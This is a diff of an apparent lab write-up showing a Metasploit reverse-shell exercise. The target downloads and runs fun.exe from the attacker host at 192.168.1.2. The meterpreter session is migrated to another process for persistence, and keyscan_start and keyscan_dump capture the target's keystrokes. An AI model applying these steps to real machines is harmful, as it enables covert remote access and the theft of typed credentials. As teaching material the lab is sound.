@@ -71,20 +71,20 @@ On the target Windows machine, open a Web browser and open this URL, replacing t
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
 
-![Screenshot 2024-10-09 082936](https://github.com/user-attachments/assets/6c2f5125-3af1-4220-9d09-3de65ce1c6f1)
+![image](https://github.com/user-attachments/assets/663b2b1a-8987-4971-9666-0fe5af0f85a9)
+
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 
-![Screenshot 2024-10-09 082947](https://github.com/user-attachments/assets/30514d6a-414c-4acc-8545-6bda15593bad)
-
 On kali give the command exploit
 
-![Screenshot 2024-10-09 082956](https://github.com/user-attachments/assets/ad2511f0-706e-42c8-bc08-8527e5b31cd5)
+![image](https://github.com/user-attachments/assets/8e2e2e2d-5b20-4452-a74c-fce642758d11)
+
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
 ps  ⇒ can see the fun.exe process running with pid 1156
+![image](https://github.com/user-attachments/assets/06e520e2-1dba-4560-a20d-e646c5687f34)
 
-![image](https://github.com/user-attachments/assets/d13f9ccb-d5d5-4b40-9d57-f90f5ce8e49e)
 
 The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
 To become more persistent, we'll migrate to a process that will last longer.
@@ -96,20 +96,18 @@ netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
 
-![Screenshot 2024-10-09 083017](https://github.com/user-attachments/assets/15693580-f55a-4729-89ea-b4a8245ad8fd)
+
 
 Post Exploitation
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 
-![Screenshot 2024-10-09 083042](https://github.com/user-attachments/assets/d3955e35-d9f8-4319-8e23-910884f3bf40)
-
-![Screenshot 2024-10-09 083053](https://github.com/user-attachments/assets/a091a620-6605-4976-b330-edd98659798f)
 
 
 keyscan_dump	Shows the keystrokes captured so far
 
-![Screenshot 2024-10-09 083101](https://github.com/user-attachments/assets/e8496e1e-b936-41a6-b8d5-fcd5e86e8dd6)
+
+
 
 
 ## RESULT:
